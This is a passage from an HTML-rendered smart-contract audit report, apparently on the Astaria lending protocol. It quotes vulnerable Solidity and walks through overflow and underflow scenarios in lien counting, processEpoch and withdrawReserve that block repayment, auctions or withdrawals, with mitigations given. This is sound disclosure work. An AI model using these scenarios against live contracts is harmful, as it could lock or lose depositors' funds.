class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newSlope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienSlope</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo48</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_setSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">newSlope</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yIntercept</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">increaseYIntercept</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">last</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo40</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_decreaseEpochLienCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienEnd</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo64</span><span class=\"mtk1\">()));  </span><span class=\"mtk3\">// @audit: decrease liensOpenForEpoch </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">YInterceptChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yIntercept</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Since the liensOpenForEpoch of the public vault decreases when the lien token is repaid, and since the liensOpenForEpoch of public vault A is not increased, then when that lien token is repaid, _payment will fail due to overflow when decreasing the liensOpenForEpoch.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isPublicVault</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// since the openLiens count is only positive when there are liens that haven&#39;t been paid off</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// that should be liquidated, this lien should not be counted anymore</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decreaseEpochLienCount</span><span class=\"mtk1\">(  </span><span class=\"mtk3\">//  @audit: overflow here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">IPublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lienOwner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">end</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span></code></pre>\n<p>Consider the following case.</p>\n<ul>\n<li>Public Vault B holds a lien token and B.liensOpenForEpoch == 1</li>\n<li>Public Vault A buys out B’s lien token for refinancing, B.liensOpenForEpoch == 0, A.liensOpenForEpoch == 0</li>\n<li>borrower wants to repay the loan, in the _payment function, the decreaseEpochLienCount function of Vault A will be called, <code>A.liensOpenForEpoch--</code>will trigger an overflow, resulting in borrower not being able to repay the loan, and borrower’s collateral will be auctioned off, but in the call to updateVaultAfterLiquidation function will also fail in decreaseEpochLienCount due to the overflow</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateVaultAfterLiquidation</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxAuctionWindow</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AfterLiquidationParams</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyLienToken</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawProxyIfNearBoundary</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_accrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_setSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienSlope</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo48</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">transferWithdrawReserve</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienEnd</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_decreaseEpochLienCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lienEpoch</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//  @audit: overflow here</span></span></span></code></pre>\n<p>As a result, the borrower cannot repay the loan and the borrower’s collateral cannot be auctioned off, thus causing the depositor of the public vault to suffer a loss</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L843\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L843</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L640-L655\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L640-L655</a></p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In LienToken.buyoutLien, when the caller is a public vault, increase the decreaseEpochLienCount of the public vault.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/222\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-17-function-processepoch-in-publicvault-would-revert-when-most-of-the-users-withdraw-their-funds-because-of-the-underflow-for-new-yintercept-calculation\" style=\"position:relative;\"><a href=\"#h-17-function-processepoch-in-publicvault-would-revert-when-most-of-the-users-withdraw-their-funds-because-of-the-underflow-for-new-yintercept-calculation\" aria-label=\"h 17 function processepoch in publicvault would revert when most of the users withdraw their funds because of the underflow for new yintercept calculation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/188\">[H-17] Function <code>processEpoch()</code> in PublicVault would revert when most of the users withdraw their funds because of the underflow for new yIntercept calculation</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/188\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/408\">evan</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/319\">0xbepresent</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L335\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L335</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L479-L493\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L479-L493</a></p>\n<p>When users withdraw their vault tokens PublicVault mint WithdrawProxy’s shares token for them and at the end of the epoch PublicVault would calculated WithdrawProxy’s assets and update PublicVault assets and start the next epoch. if a lot of users withdraws their funds then the value of the <code>totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)</code> (the amount belongs to the WithdrawProxy) would be higher than <code>yIntercept</code> and code would revert because of the underflow when setting the new value of the <code>yIntercept</code>. This would cause last users to not be able to withdraw their funds and contract epoch system to be broken for a while.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is part of <code>processEpoch()</code> code that calculates ratio between WithdrawProxy and PublicVault:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function processEpoch() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">.....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">.....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // reset liquidationWithdrawRatio to prepare for re calcualtion</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    s.liquidationWithdrawRatio = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check if there are LPs withdrawing this epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if ((address(currentWithdrawProxy) != address(0))) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 proxySupply = currentWithdrawProxy.totalSupply();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      s.liquidationWithdrawRatio = proxySupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .mulDivDown(1e18, totalSupply())</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        .safeCastTo88();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 expected = currentWithdrawProxy.getExpected();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (totalAssets() &gt; expected) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          s.withdrawReserve = (totalAssets() - expected)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            .mulWadDown(s.liquidationWithdrawRatio)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            .safeCastTo88();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          s.withdrawReserve = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _setYIntercept(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        s.yIntercept -</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // burn the tokens of the LPs withdrawing</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _burn(address(this), proxySupply);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see in the line <code>_setYIntercept(s, s.yIntercept - totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18))</code> code tries to set new value for <code>yIntercept</code> but This is <code>totalAssets()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function totalAssets()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    public</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    view</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    virtual</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    override(ERC4626Cloned)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    returns (uint256)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VaultData storage s = _loadStorageSlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return _totalAssets(s);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _totalAssets(VaultData storage s) internal view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 delta_t = block.timestamp - s.last;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>So as you can see <code>totalAssets()</code> can be higher than <code>yIntercept</code> and if most of the user withdraw their funds(for example the last user) then the value of <code>liquidationWithdrawRatio</code> would be near <code>1</code> too and the value of <code>totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)</code> would be bigger than <code>yIntercept</code> and call to <code>processEpoch()</code> would revert and code can’t start the next epoch and user withdraw process can’t be finished and funds would stuck in the contract.</p>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Prevent underflow by calling <code>accrue()</code> in the begining of the <code>processEpoch()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/408#event-8415693497\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#408</code></a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/188#issuecomment-1443477344\">Picodes (judge) increased severity to High</a></strong></p>\n<hr>\n<h2 id=\"h-18-publicvaultprocessepoch-calculates-withdrawreserve-incorrectly-users-can-lose-funds\" style=\"position:relative;\"><a href=\"#h-18-publicvaultprocessepoch-calculates-withdrawreserve-incorrectly-users-can-lose-funds\" aria-label=\"h 18 publicvaultprocessepoch calculates withdrawreserve incorrectly users can lose funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/157\">[H-18] <code>PublicVault.processEpoch</code> calculates <code>withdrawReserve</code> incorrectly; Users can lose funds</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/157\">rvierdiiev</a></em></p>\n<p>PublicVault.processEpoch calculates withdrawReserve incorrectly. As result user can receive less funds when totalAssets() &#x3C;= expected from auction.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When users wants to withdraw from <code>PublicVault</code> then <code>WithdrawProxy</code> is deployed and <code>PublicVault.processEpoch</code> function is responsible to calculate <code>s.withdrawReserve</code>.\nThis amount depends on how many shares should be redeemed and if there is auction for the epoch.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L343\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L343</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function processEpoch() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check to make sure epoch is over</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (timeToEpochEnd() &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidState(InvalidStates.EPOCH_NOT_OVER);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VaultData storage s = _loadStorageSlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (s.withdrawReserve &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidState(InvalidStates.WITHDRAW_RESERVE_NOT_ZERO);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    WithdrawProxy currentWithdrawProxy = 